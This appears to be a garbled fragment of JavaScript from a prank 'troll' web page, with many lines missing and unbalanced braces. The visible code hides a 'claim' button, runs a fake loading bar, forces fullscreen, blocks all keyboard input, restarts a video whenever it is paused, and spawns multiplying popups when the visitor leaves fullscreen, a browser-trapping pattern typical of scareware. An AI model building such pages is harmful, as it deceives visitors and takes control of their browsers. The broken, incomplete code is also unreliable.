    let titleIdx = 0;
    function startTitleFlicker() {

    function safePlay() {
        if (video.readyState >= 2) {

    function startTrap() {
        document.getElementById('claimBtn').style.display = 'none';

        let width = 0;
        let msgIdx = 0;
        const loadInterval = setInterval(() => {

            }

                clearInterval(loadInterval);

    function requestFS() {
        const el = document.documentElement;

    // M·ªü popup.html d·∫°ng c·ª≠a s·ªï nh·ªè ch·ª©a video
    let popupCount = 1;

    function launchTroll() {
        uiBox.style.display = "none";

        safePlay();

        window.addEventListener('keydown',  blockKey, true);
        window.addEventListener('keyup',    blockKey, true);
        window.addEventListener('keypress', blockKey, true);

        video.addEventListener('pause', () => safePlay());

        document.addEventListener('fullscreenchange', onFSChange);

    }

    let msgIndex = 0;

        const isFS = !!(document.fullscreenElement || document.webkitFullscreenElement);

            spawnPopups(popupCount);
            popupCount = Math.min(popupCount * 2, 16);

    function spawnPopups(count) {
        for (let i = 0; i < count; i++) {
            setTimeout(() => createPopup(spamMessages[msgIndex++ % spamMessages.length], i), i * 80);
        }
    }

    function createPopup(msg, offset) {
        const popup = document.createElement('div');
